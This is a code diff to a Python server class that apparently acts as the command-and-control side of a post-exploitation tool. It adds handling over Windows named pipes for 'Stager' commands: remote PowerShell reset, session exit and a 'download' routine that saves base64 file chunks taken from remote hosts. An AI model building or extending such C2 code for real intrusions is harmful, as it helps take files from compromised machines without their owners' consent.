@@ -505,6 +505,59 @@ class myserver():
                 win32file.WriteFile(mypipe, encode_cmd)
                 recv_result = t_mypipehandler.get_nextmsg()
                 myhistory.append("[Stager] Send command result: {}".format(recv_result))
+                
+                if cmd_struct_to_send[0] == "psreset" or cmd_struct_to_send[0] == "psremote":
+                    #get ack, no send
+                    recv_result = t_mypipehandler.get_nextmsg()
+                    myhistory.append("[Result] Run Command result: {}".format(recv_result))
+                    myhistory.append("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
+                    continue
+                
+                if cmd_struct_to_send[0] == "download":
+                    #next message is either data or error code
+                    recv_result = t_mypipehandler.get_nextmsg()
+                    while (recv_result != self.__t_myconstant_networking.DL_SUCCESS):
+                        if decoder.isBase64(recv_result):
+                            data_array = decoder.b64_decode(recv_result)
+                            fileanme = os.path.basename(cmd_struct_to_send[1]) # platform dependent
+                            myhistory.append("[Result] Writing to {}".format(fileanme))
+                            with open(os.path.join("DLDB\\",fileanme),mode = "ab") as f:
+                                f.write(data_array)
+
+                        else:
+                            myhistory.append("[Result] Something wrong with download data ... ")
+                            myhistory.append("[Result] Error: {}".format(recv_result))
+                        
+                        recv_result = t_mypipehandler.get_nextmsg()
+                    
+                    #ack in all cases
+                    encode_cmd = t_mypipehandler.msf_encode(self.__t_myconstant_networking.DL_SUCCESS).encode("utf8", "ignore")
+                    win32file.WriteFile(mypipe, encode_cmd)
+                    myhistory.append("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
+                    continue
+
+                if cmd_struct_to_send[0] == "exit":
+                    #init exit
+                    recv_result = t_mypipehandler.get_nextmsg()
+                    myhistory.append("[Result] Run Command result: {}".format(recv_result))
+                    #myhistory.append("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
+
+                    #ack
+                    encode_cmd = t_mypipehandler.msf_encode("EXIT_SUCCESS").encode("utf8", "ignore")
+                    win32file.WriteFile(mypipe, encode_cmd)
+                    time.sleep(10)
+                    #shutdown
+                    win32file.CloseHandle(self.__mypipe_myhandle_list[myuuid])
+                    #remove from worker list
+                    self.__mydata_list.pop(myuuid, None)
+                    self.__mysocket_list.pop(myuuid, None)
+                    self.__myaddr_list.pop(myuuid, None)
+                    self.__mystart_list[myuuid] = False
+                    myhistory.append("[Result] {} is stoped ...".format(myuuid))
+                    myhistory.append("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
+                    break
+
+
 
                 # try get cmd result if any
                 recv_result = t_mypipehandler.get_nextmsg()
